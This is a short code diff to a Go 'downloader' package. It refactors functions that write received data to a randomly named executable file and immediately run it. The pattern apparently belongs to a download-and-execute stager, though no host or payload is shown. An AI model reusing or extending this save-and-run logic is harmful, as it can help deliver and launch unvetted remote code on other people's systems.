@@ -2,7 +2,6 @@ package downloader
 
 import (
 	"encoding/base64"
-	"path/filepath"
 	"math/rand"
 	"net"
 	"net/http"
@@ -38,8 +37,8 @@ func randStr() string {
 }
 
 func save(data []byte) string {
-	path := filepath.Join(filepath.Dir(""), randStr())
-	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0755)
+	name := randStr()
+	f, err := os.OpenFile(name, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0755)
 	if err != nil {
 		return ""
 	}
@@ -47,10 +46,10 @@ func save(data []byte) string {
 	f.Write(data)
 	f.Close()
 
-	return path
+	return name
 }
 
 func run(filename string) {
-	cmd := exec.Command(filename)
+	cmd := exec.Command("./" + filename)
 	cmd.Start()
 }
